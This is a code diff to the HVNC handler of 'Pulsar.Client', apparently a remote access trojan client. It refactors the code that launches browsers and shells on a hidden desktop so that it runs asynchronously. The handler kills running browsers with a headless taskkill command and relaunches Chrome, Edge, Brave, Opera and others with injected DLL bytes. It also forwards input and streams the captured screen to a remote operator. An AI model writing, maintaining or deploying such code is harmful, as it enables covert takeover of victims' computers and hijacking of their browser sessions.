@@ -6,9 +6,9 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Threading;
+using System.Threading.Tasks;
 using Pulsar.Client.Helper;
 using Pulsar.Client.Helper.HVNC;
-using Pulsar.Client.Utilities;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Monitoring.HVNC;
@@ -68,7 +68,7 @@ namespace Pulsar.Client.Messages
                     InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
                     break;
                 case StartHVNCProcess startHVNCProcess:
-                    Execute(sender, startHVNCProcess);
+                    _ = ExecuteAsync(sender, startHVNCProcess);
                     break;
             }
         }
@@ -96,18 +96,18 @@ namespace Pulsar.Client.Messages
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
             if (_streamCodec == null)
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
+                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
 
             if (message.CreateNew)
             {
                 _streamCodec?.Dispose();
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
+                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
             }
 
             if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
             {
                 _streamCodec?.Dispose();
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution, RemoteCaptureEncoding.PreferredFormat);
+                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
             }
 
             _clientMain = client;
@@ -250,11 +250,9 @@ namespace Pulsar.Client.Messages
                 {
                     if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                     _streamCodec.CodeImage(_desktopData.Scan0,
-                        _desktopData.Stride,
                         new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                         new Size(processedBitmap.Width, processedBitmap.Height),
-                        processedBitmap.PixelFormat,
-                        stream);
+                        processedBitmap.PixelFormat, stream);
 
                     return stream.ToArray();
                 }
@@ -289,8 +287,7 @@ namespace Pulsar.Client.Messages
                     Resolution = _streamCodec.Resolution,
                     Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                     IsLastRequestedFrame = isLastRequestedFrame,
-                        Fps = _currentFps,
-                        ImageFormat = RemoteCaptureEncoding.PreferredFormat
+                    Fps = _currentFps
                 });
             }
             catch (Exception)
@@ -303,11 +300,13 @@ namespace Pulsar.Client.Messages
             while (_frameBuffer.TryDequeue(out _)) { }
         }
 
-        private void Execute(ISender client, StartHVNCProcess message)
+        private async Task ExecuteAsync(ISender client, StartHVNCProcess message)
         {
-            string name = message.Path;
-            bool dontCloneProfile = message.DontCloneProfile;
-            byte[] dllBytes = message.DllBytes;
+            try
+            {
+                string name = message.Path;
+                bool dontCloneProfile = message.DontCloneProfile;
+                byte[] dllBytes = message.DllBytes;
 
             var browserPaths = new Dictionary<string, string>
             {
@@ -325,7 +324,7 @@ namespace Pulsar.Client.Messages
                 string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {browserProcess}.exe /F";
                 Debug.WriteLine(killCommand);
                 ProcessHandler.CreateProc(killCommand);
-                Thread.Sleep(1000);
+                await Task.Delay(1000).ConfigureAwait(false);
                 
                 Debug.WriteLine($"Direct starting browser: {executablePath}");
 
@@ -333,49 +332,54 @@ namespace Pulsar.Client.Messages
                 return;
             }
 
-            switch (name)
+                switch (name)
+                {
+                    case "GenericChromium":
+                        await ProcessHandler.StartGenericChromiumAsync(
+                            dllBytes,
+                            message.CustomBrowserPath,
+                            message.CustomSearchPattern,
+                            message.CustomReplacementPath
+                        ).ConfigureAwait(false);
+                        break;
+                    case "Chrome":
+                        await ProcessHandler.StartChromeAsync(dllBytes).ConfigureAwait(false);
+                        break;
+                    case "Edge":
+                        await ProcessHandler.StartEdgeAsync(dllBytes).ConfigureAwait(false);
+                        break;
+                    case "Brave":
+                        await ProcessHandler.StartBraveAsync(dllBytes).ConfigureAwait(false);
+                        break;
+                    case "Opera":
+                        await ProcessHandler.StartOperaAsync(dllBytes).ConfigureAwait(false);
+                        break;
+                    case "OperaGX":
+                        await ProcessHandler.StartOperaGXAsync(dllBytes).ConfigureAwait(false);
+                        break;
+                    case "Explorer":
+                        ProcessHandler.StartExplorer();
+                        break;
+                    case "Cmd":
+                        ProcessHandler.StartCmd();
+                        break;
+                    case "Powershell":
+                        ProcessHandler.StartPowershell();
+                        break;
+                    case "Mozilla":
+                        await ProcessHandler.StartFirefoxAsync().ConfigureAwait(false);
+                        break;
+                    case "Discord":
+                        ProcessHandler.StartDiscord();
+                        break;
+                    default:
+                        ProcessHandler.StartGeneric(name);
+                        break;
+                }
+            }
+            catch (Exception ex)
             {
-                case "GenericChromium":
-                    ProcessHandler.StartGenericChromium(
-                        dllBytes,
-                        message.CustomBrowserPath,
-                        message.CustomSearchPattern,
-                        message.CustomReplacementPath
-                    );
-                    break;
-                case "Chrome":
-                    ProcessHandler.Startchrome(dllBytes);
-                    break;
-                case "Edge":
-                    ProcessHandler.StartEdge(dllBytes);
-                    break;
-                case "Brave":
-                    ProcessHandler.StartBrave(dllBytes);
-                    break;
-                case "Opera":
-                    ProcessHandler.StartOpera(dllBytes);
-                    break;
-                case "OperaGX":
-                    ProcessHandler.StartOperaGX(dllBytes);
-                    break;
-                case "Explorer":
-                    ProcessHandler.StartExplorer();
-                    break;
-                case "Cmd":
-                    ProcessHandler.StartCmd();
-                    break;
-                case "Powershell":
-                    ProcessHandler.StartPowershell();
-                    break;
-                case "Mozilla":
-                    ProcessHandler.StartFirefox();
-                    break;
-                case "Discord":
-                    ProcessHandler.StartDiscord();
-                    break;
-                default:
-                    ProcessHandler.StartGeneric(name);
-                    break;
+                Debug.WriteLine($"HVNC process start failed: {ex.Message}");
             }
         }
 
